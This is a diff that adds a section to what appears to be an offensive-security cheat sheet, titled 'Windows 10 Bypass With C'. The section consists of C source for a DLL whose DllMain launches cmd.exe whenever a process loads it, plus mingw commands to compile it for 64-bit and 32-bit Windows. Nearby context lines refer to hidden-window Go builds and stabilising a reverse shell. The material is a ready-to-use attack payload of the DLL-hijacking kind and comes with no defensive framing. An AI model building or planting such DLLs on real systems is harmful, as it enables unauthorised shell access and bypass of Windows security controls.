@@ -32,6 +32,45 @@ GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-H windowsgui -s -w" 
 ```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+#  🖥️ Windows 10 Bypass With C
+### nano pleasesubscribe.c
+```
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+    HANDLE hModule,               // Handle to DLL module
+    DWORD ul_reason_for_call,     // Reason for calling function
+    LPVOID lpReserved             // Reserved
+)
+{
+    switch (ul_reason_for_call)
+    {
+        case DLL_PROCESS_ATTACH:  // A process is loading the DLL.
+            int i;
+            i = system("cmd.exe");
+            break;
+        case DLL_THREAD_ATTACH:   // A process is creating a new thread.
+            break;
+        case DLL_THREAD_DETACH:   // A thread exits normally.
+            break;
+        case DLL_PROCESS_DETACH:  // A process unloads the DLL.
+            break;
+    }
+    return TRUE;
+}
+```
+
+### Compile it !
+```elixir
+# for x64
+x86_64-w64-mingw32-gcc pleasesubscribe.c --shared -o pleasesubscribe.dll
+
+# for x32
+i686-w64-mingw32-gcc pleasesubscribe.c -shared -o pleasesubscribe.dll
+```
+
+
+
 # Stablize Reverse shell
 ### script
 ```bash
